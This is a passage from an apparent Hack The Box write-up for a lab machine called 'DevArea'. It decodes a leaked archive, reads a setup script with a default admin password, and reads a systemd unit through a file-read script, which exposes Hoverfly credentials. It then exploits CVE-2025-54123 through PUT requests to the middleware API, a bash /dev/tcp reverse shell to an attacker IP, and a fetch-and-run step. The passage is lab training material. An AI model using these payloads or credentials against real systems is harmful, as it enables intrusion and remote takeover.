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 | base64 -d > syswatch-v1.zip
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/DevArea/files]
└─$ unzip syswatch-v1.zip 
Archive:  syswatch-v1.zip
  End-of-central-directory signature not found.  Either this file is not
  a zipfile, or it constitutes one disk of a multi-part archive.  In the
  latter case the central directory and zipfile comment will be found on
  the last disk(s) of this archive.
note:  syswatch-v1.zip may be a plain executable, not an archive
unzip:  cannot find zipfile directory in one of syswatch-v1.zip or
        syswatch-v1.zip.zip, and cannot find syswatch-v1.zip.ZIP, period.
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/DevArea/files]
└─$ unzip syswatch-v1.zip 
Archive:  syswatch-v1.zip
   creating: syswatch/
   creating: syswatch/logs/
 extracting: syswatch/logs/disk.log  
 extracting: syswatch/logs/service.log  
 extracting: syswatch/logs/log-alerts.log  
 extracting: syswatch/logs/cpu-mem.log  
 extracting: syswatch/logs/network.log  
   creating: syswatch/syswatch_gui/
 extracting: syswatch/syswatch_gui/requirements.txt  
   creating: syswatch/syswatch_gui/templates/
  inflating: syswatch/syswatch_gui/templates/service_status.html  
  inflating: syswatch/syswatch_gui/templates/login.html  
  inflating: syswatch/syswatch_gui/templates/index.html  
  inflating: syswatch/syswatch_gui/templates/docs.html  
  inflating: syswatch/syswatch_gui/app.py  
  inflating: syswatch/syswatch_gui/syswatch.db  
   creating: syswatch/syswatch_gui/static/
  inflating: syswatch/syswatch_gui/static/style.css  
  inflating: syswatch/monitor.sh     
   creating: syswatch/plugins/
  inflating: syswatch/plugins/disk_monitor.sh  
  inflating: syswatch/plugins/network_monitor.sh  
  inflating: syswatch/plugins/cpu_mem_monitor.sh  
  inflating: syswatch/plugins/log_monitor.sh  
  inflating: syswatch/plugins/service_monitor.sh  
  inflating: syswatch/plugins/common.sh  
  inflating: syswatch/syswatch.sh    
   creating: syswatch/backup/
   creating: syswatch/config/
  inflating: syswatch/config/syswatch.conf  
  inflating: syswatch/setup.sh
```

```shell
┌──(kali㉿kali)-[/media/…/Machines/DevArea/files/syswatch]
└─$ cat setup.sh 
#!/bin/bash
set -euo pipefail
if [ "$(id -u)" -ne 0 ]; then echo "Require root"; exit 1; fi
echo "[*] SysWatch setup starting"
SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OPT_DIR="/opt/syswatch"
id -u syswatch >/dev/null 2>&1 || useradd --system --create-home -d "$OPT_DIR" --shell /usr/sbin/nologin syswatch
install -d -m 0755 "$OPT_DIR/plugins" "$OPT_DIR/config" "$OPT_DIR/logs" "$OPT_DIR/backup" "$OPT_DIR/syswatch_gui"
install -m 0644 "$SRC_DIR/config/syswatch.conf" "$OPT_DIR/config/syswatch.conf"
cp -r "$SRC_DIR/plugins/." "$OPT_DIR/plugins/"
install -m 0755 "$SRC_DIR/monitor.sh" "$OPT_DIR/monitor.sh"
install -m 0755 "$SRC_DIR/syswatch.sh" "$OPT_DIR/syswatch.sh"
cp -r "$SRC_DIR/syswatch_gui/." "$OPT_DIR/syswatch_gui/"
chown -R root:root "$OPT_DIR"
chown -R syswatch:syswatch "$OPT_DIR/logs"
chown -R syswatch:syswatch "$OPT_DIR/backup"

chmod 755 "$OPT_DIR" "$OPT_DIR/plugins" "$OPT_DIR/config" "$OPT_DIR/syswatch_gui"
if command -v apt-get >/dev/null 2>&1; then
  echo "[*] Installing packages via apt"
  apt-get update -y
  DEBIAN_FRONTEND=noninteractive apt-get install -y python3 python3-venv python3-pip net-tools mailutils
elif command -v dnf >/dev/null 2>&1; then
  echo "[*] Installing packages via dnf"
  dnf install -y python3 python3-venv python3-pip net-tools mailx
elif command -v yum >/dev/null 2>&1; then
  echo "[*] Installing packages via yum"
  yum install -y python3 python3-venv python3-pip net-tools mailx
else
  echo "Package manager not detected"; exit 1
fi
python3 -m venv "$OPT_DIR/venv"
"$OPT_DIR/venv/bin/pip" install --upgrade pip
"$OPT_DIR/venv/bin/pip" install -r "$OPT_DIR/syswatch_gui/requirements.txt"
ENV_FILE="/etc/syswatch.env"
SECRET="${SYSWATCH_SECRET_KEY:-}"
ADMIN="${SYSWATCH_ADMIN_PASSWORD:-}"
if [ -z "$SECRET" ]; then
  if command -v openssl >/dev/null 2>&1; then
    SECRET="$(openssl rand -hex 32)"
  else
    SECRET="$(head -c 32 /dev/urandom | xxd -p)"
  fi
fi
[ -z "$ADMIN" ] && ADMIN="SyswatchAdmin2026"
cat > "$ENV_FILE" <<EOF
SYSWATCH_SECRET_KEY=$SECRET
SYSWATCH_ADMIN_PASSWORD=$ADMIN
SYSWATCH_LOG_DIR=$OPT_DIR/logs
SYSWATCH_DB_PATH=$OPT_DIR/syswatch_gui/syswatch.db
SYSWATCH_PLUGIN_DIR=$OPT_DIR/plugins
SYSWATCH_BACKUP_DIR=$OPT_DIR/backup
SYSWATCH_VERSION=1.0.0
EOF
chmod 755 "$ENV_FILE"
WEB_UNIT="/etc/systemd/system/syswatch-web.service"
cat > "$WEB_UNIT" <<EOF
[Unit]
Description=SysWatch Web GUI
After=network.target

[Service]
Type=simple
User=syswatch
Group=syswatch
EnvironmentFile=$ENV_FILE
WorkingDirectory=$OPT_DIR/syswatch_gui
ExecStart=$OPT_DIR/venv/bin/python $OPT_DIR/syswatch_gui/app.py
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOF
MON_SVC="/etc/systemd/system/syswatch-monitor.service"
cat > "$MON_SVC" <<EOF
[Unit]
Description=SysWatch Monitor Runner

[Service]
Type=oneshot
User=root
Group=root
EnvironmentFile=$ENV_FILE
ExecStart=/bin/bash $OPT_DIR/monitor.sh
EOF
MON_TIMER="/etc/systemd/system/syswatch-monitor.timer"
cat > "$MON_TIMER" <<EOF
[Unit]
Description=Run SysWatch Monitor every 5 minutes

[Timer]
OnBootSec=2min
OnUnitActiveSec=5min
Unit=syswatch-monitor.service

[Install]
WantedBy=timers.target
EOF
install -m 0755 "$OPT_DIR/syswatch.sh" /usr/local/bin/syswatch
systemctl daemon-reload
systemctl enable --now syswatch-web.service
systemctl enable --now syswatch-monitor.timer
#if command -v ufw >/dev/null 2>&1; then ufw allow 7777/tcp || true; fi
echo "[+] SysWatch setup complete"
```

| Password          |
| ----------------- |
| SyswatchAdmin2026 |

## Enumeration of Port 8888/TCP

With the file read primitive in hand we targeted the `hoverfly.service` systemd unit file to extract the credentials used to start the `Hoverfly` service.

- [http://devarea.htb:8888/login](http://devarea.htb:8888/login)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://devarea.htb:8888/login
http://devarea.htb:8888/login [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.18.122], Script[text/javascript], Title[Hoverfly Dashboard]
```

Reading the `hoverfly.service` unit file exposed the admin credentials passed as command-line arguments to the `hoverfly` binary.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/DevArea/files]
└─$ python3 lfi.py -f /etc/systemd/system/multi-user.target.wants/hoverfly.service
[*] Target : http://devarea.htb:8080/employeeservice
[*] File   : /etc/systemd/system/multi-user.target.wants/hoverfly.service
[*] Sending MTOM/XOP payload …

[*] HTTP 200

[+] Contents of /etc/systemd/system/multi-user.target.wants/hoverfly.service:

[Unit]
Description=HoverFly service
After=network.target

[Service]
User=dev_ryan
Group=dev_ryan
WorkingDirectory=/opt/HoverFly
ExecStart=/opt/HoverFly/hoverfly -add -username admin -password O7IJ27MyyXiU -listen-on-host 0.0.0.0

Restart=on-failure
RestartSec=5
StartLimitIntervalSec=60
StartLimitBurst=5
LimitNOFILE=65536
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
```

| Username | Password     |
| -------- | ------------ |
| admin    | O7IJ27MyyXiU |

The credentials worked on the `Hoverfly Dashboard` and granted us access to the dashboard.

![](images/2026-03-28_20-51_8888_dashboard.png)

## Initial Access

### CVE-2025-54123: Remote Code Execution (RCE) in hoverfly at /api/v2/hoverfly/middleware endpoint due to insecure Middleware Implementation

Research into the `Hoverfly` version running on the target revealed it was vulnerable to `CVE-2025-54123`. The `/api/v2/hoverfly/middleware` endpoint accepts a `PUT` request that allows specifying a `binary` and a `script` to execute as middleware. Due to an insecure implementation, the supplied `script` value is executed directly by the specified `binary` without adequate sanitisation, resulting in `Remote Code Execution` (`RCE`).

- [https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf](https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf)

To verify code execution we sent a `PUT` request with `whoami` as the script value. The `422` response body confirmed execution as `dev_ryan`.

```shell
PUT /api/v2/hoverfly/middleware HTTP/1.1
Host: devarea.htb:8888
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU3NjczOTAsImlhdCI6MTc3NDcyNzM5MCwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.ex5KraH4PGmvttmiH47bca1kAyqgkLYMWBW2VoAnqX_wQbPWnKR98MetqBnvvTv0PQVJuH54uGxV3oL1W2KBDw
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Referer: http://devarea.htb:8888/dashboard
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Length: 60

{
    "binary": "/bin/bash",
    "script": "whoami"
}


```

```shell
HTTP/1.1 422 Unprocessable Entity
Date: Sat, 28 Mar 2026 19:53:45 GMT
Content-Length: 489
Content-Type: text/plain; charset=utf-8

{"error":"Failed to unmarshal JSON from middleware\nCommand: /bin/bash /tmp/hoverfly/hoverfly_784635703\ninvalid character 'd' looking for beginning of value\n\nSTDIN:\n{\"response\":{\"status\":200,\"body\":\"ok\",\"encodedBody\":false,\"headers\":{\"test_header\":[\"true\"]}},\"request\":{\"path\":\"/\",\"method\":\"GET\",\"destination\":\"www.test.com\",\"scheme\":\"\",\"query\":\"\",\"formData\":null,\"body\":\"\",\"headers\":{\"test_header\":[\"true\"]}}}\n\nSTDOUT:\ndev_ryan\n"}
```

![](images/2026-03-28_20-54_burpsuite_poc_execution.png)

With confirmed code execution, we prepared a reverse shell payload, hosted it over `HTTP` with a `Python` web server, and modified the middleware script to fetch and execute it.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/DevArea/serve]
└─$ cat x 
#!/bin/bash
bash -c '/bin/bash -i >& /dev/tcp/10.10.16.10/9001 0>&1'
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/DevArea/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Sending the final payload triggered an outbound connection to our listener.

```shell
PUT /api/v2/hoverfly/middleware HTTP/1.1
Host: devarea.htb:8888
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjIwODU3NjczOTAsImlhdCI6MTc3NDcyNzM5MCwic3ViIjoiIiwidXNlcm5hbWUiOiJhZG1pbiJ9.ex5KraH4PGmvttmiH47bca1kAyqgkLYMWBW2VoAnqX_wQbPWnKR98MetqBnvvTv0PQVJuH54uGxV3oL1W2KBDw
Accept-Language: en-US,en;q=0.9
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
